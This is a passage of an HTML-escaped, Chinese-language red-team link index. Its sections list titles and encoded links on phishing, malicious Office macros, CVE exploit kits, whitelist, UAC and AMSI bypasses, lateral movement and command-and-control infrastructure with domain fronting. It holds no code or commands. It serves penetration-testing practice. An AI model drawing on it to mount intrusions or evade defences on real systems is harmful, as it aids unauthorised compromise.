&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jeWJlcnN5bmRpY2F0ZXMuY29tLzIwMTUvMDYvdmVpbC1ldmFzaW9uLWFlcy1lbmNyeXB0ZWQtaHR0cGtleS1yZXF1ZXN0LW1vZHVsZS8=&#34;&gt;VEIL-EVASION 的 AES 加密 HTTPKEY 请求：沙盒逃逸&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jeWJlcnN5bmRpY2F0ZXMuY29tLzIwMTYvMTIvZWdyZXNzaW5nLWJsdWVjb2F0LXdpdGgtY29iYWx0c3Rpa2UtbGV0c2VuY3J5cHQv&#34;&gt;EGRESSING BLUECOAT WITH COBALTSTIKE &amp;amp; LET&#39;S ENCRYPT&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jeWJlcnN5bmRpY2F0ZXMuY29tLzIwMTYvMDUvZW1haWwtcmVjb25uYWlzc2FuY2UtcGhpc2hpbmctdGVtcGxhdGUtZ2VuZXJhdGlvbi1tYWRlLXNpbXBsZS8=&#34;&gt;电子邮件侦察与钓鱼邮件模版生成&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNvYmFsdHN0cmlrZS5jb20vMjAxNS8wNS8xNC9hbi11bm5lY2Vzc2FyeS1hZGRpY3Rpb24tdG8tZG5zLWNvbW11bmljYXRpb24v&#34;&gt;不必依赖 DNS 通信&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9menVja2VybWFuLndvcmRwcmVzcy5jb20vMjAxNi8xMC8wNi9wb3dlcnNoZWxsLWVtcGlyZS1zdGFnZXJzLTEtcGhpc2hpbmctd2l0aC1hbi1vZmZpY2UtbWFjcm8tYW5kLWV2YWRpbmctYXZzLw==&#34;&gt;POWERSHELL EMPIRE 策略 1: 使用 Office 宏指令进行钓鱼与逃避杀软&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuYmxhY2toaWxsc2luZm9zZWMuY29tL3BoaXNoaW5nLXdpdGgtcG93ZXJwb2ludC8=&#34;&gt;使用 PowerPoint 进行钓鱼&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9lbmlnbWEweDMubmV0LzIwMTYvMDMvMTUvcGhpc2hpbmctd2l0aC1lbXBpcmUv&#34;&gt;使用 EMPIRE 进行钓鱼&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5zaXhkdWIubmV0Lz9wPTYyNw==&#34;&gt;Empire 与工具多样性：整合是关键&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;-4&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#-4&#34;&gt;#&lt;/a&gt; &lt;a href=&#34;#table-of-contents&#34;&gt;↑&lt;/a&gt; 植入&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cubWRzZWMuY28udWsvMjAxNy8wNC9leHBsb2l0aW5nLWN2ZS0yMDE3LTAxOTktaHRhLWhhbmRsZXItdnVsbmVyYWJpbGl0eS8=&#34;&gt;CVE-2017-0199: HTA 处理漏洞&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2JoZHJlc2gvQ1ZFLTIwMTctMDE5OQ==&#34;&gt;CVE-2017-0199 工具包&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3Z5c2VjL0NWRS0yMDE3LTg3NTktRXhwbG9pdC1zYW1wbGU=&#34;&gt;CVE-2017-8759 Exploit 示例&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3Z5c2VjL1dpbmRvd3MtU2lnbmVkQmluYXJ5&#34;&gt;签名 Window 二进制程序&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9sYWJzLm13cmluZm9zZWN1cml0eS5jb20vdG9vbHMvd2Vwd25pc2Uv&#34;&gt;Wepwnise&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oYWtzaG9wLmNvbS9wcm9kdWN0cy9iYXNoLWJ1bm55&#34;&gt;Bash Bunny&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2VuaWdtYTB4My9HZW5lcmF0ZS1NYWNybw==&#34;&gt;生成宏的工具&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuYmxhY2toaWxsc2luZm9zZWMuY29tL2VtcGlyZXMtY3Jvc3MtcGxhdGZvcm0tb2ZmaWNlLW1hY3JvLw==&#34;&gt;Empire 中的跨平台 Office 宏&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly80c3lzb3BzLmNvbS9hcmNoaXZlcy9leGNlbC1tYWNyb3Mtd2l0aC1wb3dlcnNoZWxsLw==&#34;&gt;使用 PowerShell 执行 Excel 宏&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9waGlzaG1lLmNvbS9wb3dlcnBvaW50LWFuZC1jdXN0b20tYWN0aW9ucy8=&#34;&gt;PowerPoint 与自定义行为&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3NlY3JldHNxdWlycmVsL1NpZ1RoaWVm&#34;&gt;三步签名 mimikatz&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9yaXNjeWJ1c2luZXNzLndvcmRwcmVzcy5jb20vMjAxNy8xMC8wNy9oaWRpbmcteW91ci1wcm9jZXNzLWZyb20tc3lzaW50ZXJuYWxzLw==&#34;&gt;在 sysinternals 中隐藏你的进程&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuc2hlbGxudGVsLmNvbS9ibG9nLzIwMTYvOS8xMy9sdWNreXN0cmlrZS1hLWRhdGFiYXNlLWJhY2tlZC1ldmlsLW1hY3JvLWdlbmVyYXRvcg==&#34;&gt;Luckystrike: 邪恶 Office 文档生成器&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2dlb3JnZW1hdWVyLm5ldC8yMDE3LzEwLzA3L2Nzdi1pbmplY3Rpb24uaHRtbA==&#34;&gt;被低估的 CSV 注入风险&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9zZW5zZXBvc3QuY29tL2Jsb2cvMjAxNy9tYWNyby1sZXNzLWNvZGUtZXhlYy1pbi1tc3dvcmQv&#34;&gt;MSWord 中无宏代码执行&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9tZWRpdW0uY29tL0BtYWxjb212ZXR0ZXIvbXVsdGktcGxhdGZvcm0tbWFjcm8tcGhpc2hpbmctcGF5bG9hZHMtM2I2ODhlOGVmZjY4&#34;&gt;跨平台宏钓鱼载荷&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9mdXJvbmVyLndvcmRwcmVzcy5jb20vMjAxNy8xMC8xNy9tYWNyb2xlc3MtbWFsd2FyZS10aGF0LWF2b2lkcy1kZXRlY3Rpb24td2l0aC15YXJhLXJ1bGUvYW1wLw==&#34;&gt;Macroless DOC 恶意软件躲避 Yara 规则&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibmVnLmlvLzIwMTcvMDcvMjYvZW1waXJlLXdpdGhvdXQtcG93ZXJzaGVsbC1leGUv&#34;&gt;无 Powershell 的 Empire&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuYmxhY2toaWxsc2luZm9zZWMuY29tL3Bvd2Vyc2hlbGwtd2l0aG91dC1wb3dlcnNoZWxsLWhvdy10by1ieXBhc3MtYXBwbGljYXRpb24td2hpdGVsaXN0aW5nLWVudmlyb25tZW50LXJlc3RyaWN0aW9ucy1hdi8=&#34;&gt;无 Powershell 的 Powershell 来绕过应用程序白名单&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9tZWRpdW0uY29tL0B2aXZhbWkvcGhpc2hpbmctYmV0d2Vlbi10aGUtYXBwLXdoaXRlbGlzdHMtMWI3ZGNkYWI0Mjc5&#34;&gt;应用程序白名单的钓鱼&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3N1YnQweDEwLmJsb2dzcG90LnNnLzIwMTcvMDQvYnlwYXNzLWFwcGxpY2F0aW9uLXdoaXRlbGlzdGluZy1zY3JpcHQuaHRtbA==&#34;&gt;绕过应用程序白名单脚本保护 -  Regsvr32.exe 与 COM 脚本 (.sct 文件)&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3N1YnQweDEwLmJsb2dzcG90LnNnLzIwMTcvMDQvYnlwYXNzaW5nLWFwcGxpY2F0aW9uLXdoaXRlbGlzdGluZy5odG1s&#34;&gt;使用 MSBuild.exe 绕过应用程序白名单 - Device Guard 示例与缓解措施&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;-5&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#-5&#34;&gt;#&lt;/a&gt; &lt;a href=&#34;#table-of-contents&#34;&gt;↑&lt;/a&gt; 横向移动&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cubWRzZWMuY28udWsvMjAxNi8xMi9jbmEtZXZlbnR2d3ItdWFjLWJ5cGFzcy8=&#34;&gt;Eventvwr File-less UAC Bypass CNA&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9lbmlnbWEweDMubmV0LzIwMTcvMDkvMTEvbGF0ZXJhbC1tb3ZlbWVudC11c2luZy1leGNlbC1hcHBsaWNhdGlvbi1hbmQtZGNvbS8=&#34;&gt;使用 Excel 与 dcom 进行横向移动&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9wb3N0cy5zcGVjdGVyb3BzLmlvL3dzaC1pbmplY3Rpb24tYS1jYXNlLXN0dWR5LWZkMzVmNzlkMjlkZA==&#34;&gt;WSH 注射案例研究&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9wb3N0cy5zcGVjdGVyb3BzLmlvL2ZpbGVsZXNzLXVhYy1ieXBhc3MtdXNpbmctc2RjbHQtZXhlLTNlOWY5YWQ0ZTJiMw==&#34;&gt;Fileless UAC Bypass using sdclt&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9wb3N0cy5zcGVjdGVyb3BzLmlvL2J5cGFzc2luZy1hbXNpLXZpYS1jb20tc2VydmVyLWhpamFja2luZy1iOGEzMzU0ZDFhZmY=&#34;&gt;劫持 COM 服务器绕过 AMSI&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3R5cmFuaWQvRGV2aWNlR3VhcmRCeXBhc3Nlcw==&#34;&gt;绕过 Window 10 的 Device Guard&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNvYmFsdHN0cmlrZS5jb20vMjAxNi8xMi8xNC9teS1maXJzdC1nby13aXRoLWJsb29kaG91bmQv&#34;&gt;My First Go with BloodHound&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNvYmFsdHN0cmlrZS5jb20vMjAxNy8wNi8yMy9vcHNlYy1jb25zaWRlcmF0aW9ucy1mb3ItYmVhY29uLWNvbW1hbmRzLw==&#34;&gt;OPSEC 有关 beacon command 的注意事项&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNvYmFsdHN0cmlrZS5jb20vMjAxNi8xMS8wMy9hZ2VudGxlc3MtcG9zdC1leHBsb2l0YXRpb24v&#34;&gt;无代理载荷投递&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNvYmFsdHN0cmlrZS5jb20vMjAxNS8xMi8xNi93aW5kb3dzLWFjY2Vzcy10b2tlbnMtYW5kLWFsdGVybmF0ZS1jcmVkZW50aWFscy8=&#34;&gt;Windows 访问令牌与备用凭据&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5pcm9uZ2Vlay5jb20vaS5waHA/cGFnZT12aWRlb3MvZGVyYnljb243L3QxMDQtcHNhbXNpLWFuLW9mZmVuc2l2ZS1wb3dlcnNoZWxsLW1vZHVsZS1mb3ItaW50ZXJhY3Rpbmctd2l0aC10aGUtYW50aS1tYWx3YXJlLXNjYW4taW50ZXJmYWNlLWluLXdpbmRvd3MtMTAtcnlhbi1jb2Ji&#34;&gt;PSAmsi - Windows 10 中与反恶意软件扫描接口交互的进攻性 PowerShell 模块&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3RocmVhdC50ZXZvcmEuY29tL2xheS1vZi10aGUtbGFuZC13aXRoLWJsb29kaG91bmQv&#34;&gt;Lay of the Land with BloodHound&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9zZW5zZXBvc3QuY29tL2Jsb2cvMjAxNi9icmluZ2luZy10aGUtaGFzaGVzLWhvbWUtd2l0aC1yZWdlb3JnLWVtcGlyZS8=&#34;&gt;使用 reGeorg 与 Empire 得到哈希&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9zZW5zZXBvc3QuY29tL2Jsb2cvMjAxNi9pbnRlcmNlcHRpbmctcGFzc3dvcmRzLXdpdGgtZW1waXJlLWFuZC13aW5uaW5nLw==&#34;&gt;使用 Empire 截取密码&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9zZW5zZXBvc3QuY29tL2Jsb2cvMjAxNy9vdXRsb29rLWhvbWUtcGFnZS1hbm90aGVyLXJ1bGVyLXZlY3Rvci8=&#34;&gt;Outlook 主页 – 另一个攻击向量&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9zZW5zZXBvc3QuY29tL2Jsb2cvMjAxNy9vdXRsb29rLWZvcm1zLWFuZC1zaGVsbHMv&#34;&gt;Outlook 的 Form 与 Shell&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL25ldGJpb3NYL0NoZWNrbGlzdHMvYmxvYi9tYXN0ZXIvV2luZG93cy1Qcml2aWxlZ2UtRXNjYWxhdGlvbi5tZA==&#34;&gt;Windows 提权清单&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9zaWxlbnRicmVha3NlY3VyaXR5LmNvbS90aHJvd2JhY2stdGh1cnNkYXktYS1ndWlkZS10by1jb25maWd1cmluZy10aHJvd2JhY2sv&#34;&gt;配置回滚指南&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;-6&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#-6&#34;&gt;#&lt;/a&gt; &lt;a href=&#34;#table-of-contents&#34;&gt;↑&lt;/a&gt; 命令控制&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuYmxhY2toaWxsc2luZm9zZWMuY29tL2J1aWxkLWMyLWluZnJhc3RydWN0dXJlLWRpZ2l0YWwtb2NlYW4tcGFydC0xLw==&#34;&gt;使用 Digital Ocean 构建 C2&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNvYmFsdHN0cmlrZS5jb20vMjAxNC8wOS8wOS9pbmZyYXN0cnVjdHVyZS1mb3Itb25nb2luZy1yZWQtdGVhbS1vcGVyYXRpb25zLw==&#34;&gt;红队行动的基础设施&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9yYXN0YW1vdXNlLm1lLzIwMTcvMDgvYXV0b21hdGVkLXJlZC10ZWFtLWluZnJhc3RydWN0dXJlLWRlcGxveW1lbnQtd2l0aC10ZXJyYWZvcm0tLS1wYXJ0LTEv&#34;&gt;使用 Terraform 进行红队基础设施自动化部署&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jeWJlcnN5bmRpY2F0ZXMuY29tLzIwMTYvMTEvdG9wLXJlZC10ZWFtLXRpcHMv&#34;&gt;6 个红队基础设施的小提示&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibHVlc2NyZWVub2ZqZWZmLmNvbS8yMDE3LTA1LTAyLXJlZC10ZWFtaW5nLWZvci1wYWNpZmljLXJpbS1jY2RjLTIwMTcv&#34;&gt;Pacific Rim CCDC 2017 中的红队&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibHVlc2NyZWVub2ZqZWZmLmNvbS8yMDE1LTA0LTE1LWhvdy1pLXByZXBhcmVkLXRvLXJlZC10ZWFtLWF0LXByY2NkYy0yMDE1Lw==&#34;&gt;在 PRCCDC 2015 中我是如何进行红队准备的？&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibHVlc2NyZWVub2ZqZWZmLmNvbS8yMDE2LTA1LTI0LXBhY2lmaWMtcmltLWNjZGNfMjAxNi8=&#34;&gt;Pacific Rim CCDC 2016 中的红队&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibHVlc2NyZWVub2ZqZWZmLmNvbS8yMDE3LTA4LTMwLXJhbmRvbWl6ZWQtbWFsbGVhYmxlLWMyLXByb2ZpbGVzLW1hZGUtZWFzeS8=&#34;&gt;随机化 Malleable 的 C2 配置&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibHVlc2NyZWVub2ZqZWZmLmNvbS8yMDE2LTA2LTI4LWNvYmFsdC1zdHJpa2UtaHR0cC1jMi1yZWRpcmVjdG9ycy13aXRoLWFwYWNoZS1tb2RfcmV3cml0ZS8=&#34;&gt;使用 Apache 和 mod_rewrite 重定向 Cobalt Strike 的 HTTP C2 - Jeff Dimmock&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNvYmFsdHN0cmlrZS5jb20vMjAxNy8wMi8wNi9oaWdoLXJlcHV0YXRpb24tcmVkaXJlY3RvcnMtYW5kLWRvbWFpbi1mcm9udGluZy8=&#34;&gt;高信誉的重定向与域名前置&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cubWRzZWMuY28udWsvMjAxNy8wMi90b3ItZnJvbnRpbmctdXRpbGlzaW5nLWhpZGRlbi1zZXJ2aWNlcy1mb3ItcHJpdmFjeS8=&#34;&gt;TOR Fronting – 利用隐藏服务保护隐私&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cubWRzZWMuY28udWsvMjAxNy8wMi9kb21haW4tZnJvbnRpbmctdmlhLWNsb3VkZnJvbnQtYWx0ZXJuYXRlLWRvbWFpbnMv&#34;&gt;通过 Cloudfront Alternate Domains 部署域名前置&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cucmVkdGVhbXNlY3VyZS5jb20vdGhlLXBsdWdib3QtaGFyZHdhcmUtYm90bmV0LXJlc2VhcmNoLXByb2plY3Qv&#34;&gt;PlugBot: 硬件僵尸网络研究项目&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9wb3N0cy5zcGVjdGVyb3BzLmlvL2F0dGFjay1pbmZyYXN0cnVjdHVyZS1sb2ctYWdncmVnYXRpb24tYW5kLW1vbml0b3JpbmctMzQ1ZTQxNzMwNDRl&#34;&gt;攻击基础设施日志聚合与监视&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3J2cnNoM2xsL0ZpbmRGcm9udGFibGVEb21haW5z&#34;&gt;发现前置域名&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL24wcGUtc2xlZC9BcGFjaGUyLU1vZC1SZXdyaXRlLVNldHVw&#34;&gt;安装 Apache2Mod Rewrite&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cueG9ycmlvci5jb20vRW1waXJlLURvbWFpbi1Gcm9udGluZy8=&#34;&gt;Empre 域名前置&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL21pbmlzbGxjL2RvbWFpbmh1bnRlcg==&#34;&gt;域名猎手&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNvYmFsdHN0cmlrZS5jb20vMjAxNS8xMC8yMS9taWdyYXRpbmcteW91ci1pbmZyYXN0cnVjdHVyZS8=&#34;&gt;迁移您的基础设施&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5ydnJzaDNsbC5uZXQvYmxvZy9vZmZlbnNpdmUvcmVkaXJlY3RpbmctY29iYWx0LXN0cmlrZS1kbnMtYmVhY29ucy8=&#34;&gt;重定向 Cobalt Strike 的 DNS Beacon&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly90aGVvYnNpZGlhbnRvd2VyLmNvbS8yMDE3LzA3LzI0L2QwYTdjZmNlZWRjNDJiZGYzYTM2ZjI5MjZiZDUyODYzZWYyOGJlZmMuaHRtbA==&#34;&gt;发现 Azure 中的前置域名 - thoth / Fionnbharr (@a_profligate)&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY3liZXJhcmsuY29tL3RocmVhdC1yZXNlYXJjaC1ibG9nL3JlZC10ZWFtLWluc2lnaHRzLWh0dHBzLWRvbWFpbi1mcm9udGluZy1nb29nbGUtaG9zdHMtdXNpbmctY29iYWx0LXN0cmlrZS8=&#34;&gt;对 Google Host 中的 HTTPS 域名前置的红队洞察&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cub3B0aXYuY29tL2Jsb2cvZXNjYXBlLWFuZC1ldmFzaW9uLWVncmVzc2luZy1yZXN0cmljdGVkLW5ldHdvcmtz&#34;&gt;逃出出口受限网络 - Tom Steele and Chris Patten&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5oYXJtajB5Lm5ldC9ibG9nL3Bvd2Vyc2hlbGwvY29tbWFuZC1hbmQtY29udHJvbC11c2luZy1hY3RpdmUtZGlyZWN0b3J5Lw==&#34;&gt;使用 Active Directory 构建 C2&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9wZW50ZXN0bGFiLmJsb2cvMjAxNy8wOS8yNi9jb21tYW5kLWFuZC1jb250cm9sLXR3aXR0ZXIv&#34;&gt;使用 Twitter 构建 C2&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9wZW50ZXN0bGFiLmJsb2cvMjAxNy8wOS8wNi9jb21tYW5kLWFuZC1jb250cm9sLWRucy8=&#34;&gt;使用 DNS 构建 C2&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9wZW50ZXN0bGFiLmJsb2cvMjAxNy8wNy8yOC9jb21tYW5kLWFuZC1jb250cm9sLWljbXAv&#34;&gt;使用 ICMP 构建 C2&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9wZW50ZXN0bGFiLmJsb2cvMjAxNy8wOC8yOS9jb21tYW5kLWFuZC1jb250cm9sLWRyb3Bib3gv&#34;&gt;使用 Dropbox 构建 C2&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9wZW50ZXN0bGFiLmJsb2cvMjAxNy8xMC8wNC9jb21tYW5kLWFuZC1jb250cm9sLWh0dHBzLw==&#34;&gt;使用 HTTPS 构建 C2&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9wZW50ZXN0bGFiLmJsb2cvMjAxNy8wOS8xMi9jb21tYW5kLWFuZC1jb250cm9sLXdlYmRhdi8=&#34;&gt;使用 webdav 构建 C2&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9wZW50ZXN0bGFiLmJsb2cvMjAxNy8wOC8wMy9jb21tYW5kLWFuZC1jb250cm9sLWdtYWlsLw==&#34;&gt;使用 Gmail 构建 C2&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9sYWJzLm13cmluZm9zZWN1cml0eS5jb20vYmxvZy90YXNraW5nLW9mZmljZS0zNjUtZm9yLWNvYmFsdC1zdHJpa2UtYzIv&#34;&gt;使用 Office 365 的任务用于 Cobalt Strike 的 C2&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuc2VjdXJpdHlhcnR3b3JrLmVzLzIwMTcvMDEvMzEvc2ltcGxlLWRvbWFpbi1mcm9udGluZy1wb2Mtd2l0aC1nYWUtYzItc2VydmVyLw==&#34;&gt;GAE C2 服务器简单域名前置 PoC&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;-7&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#-7&#34;&gt;#&lt;/a&gt; &lt;a href=&#34;#table-of-contents&#34;&gt;↑&lt;/a&gt; 嵌入式与物理设备&lt;/h2&gt;
&lt;ul&gt;
